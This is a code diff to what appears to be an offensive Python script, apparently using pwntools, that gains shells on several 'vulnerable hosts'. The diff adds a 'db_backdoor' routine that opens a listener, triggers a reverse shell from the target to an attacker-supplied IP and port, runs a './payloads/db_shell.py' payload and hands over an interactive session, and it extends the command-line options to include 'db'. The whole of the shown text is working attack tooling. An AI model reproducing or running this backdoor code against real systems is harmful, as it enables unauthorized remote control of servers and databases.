@@ -122,6 +122,14 @@ def web_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
     web_io.interactive(prompt='')
 
 
+def db_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
+    web_listener = listen(local_attacker_port)
+    web_reverse_shell(remote_attacker_ip, remote_attacker_port)
+    web_io = web_listener.wait_for_connection()
+    web_run_py_file(web_io, './payloads/db_shell.py')
+    web_io.interactive(prompt='')
+
+
 def ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
     web_listener = listen(local_attacker_port)
     web_reverse_shell(remote_attacker_ip, remote_attacker_port)
@@ -136,7 +144,7 @@ def ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
 
 def main():
     if len(sys.argv) < 5:
-        print(f'Usage: {sys.argv[0]} LOCAL_ATTACKER_PORT REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT <web|ca>', file=sys.stderr)
+        print(f'Usage: {sys.argv[0]} LOCAL_ATTACKER_PORT REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT <web|db|ca>', file=sys.stderr)
         sys.exit(2)
 
     local_attacker_port = int(sys.argv[1])
@@ -146,6 +154,8 @@ def main():
 
     if vulnerable_host == 'web':
         web_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
+    elif vulnerable_host == 'db':
+        db_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
     elif vulnerable_host == 'ca':
         ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port)
     else:
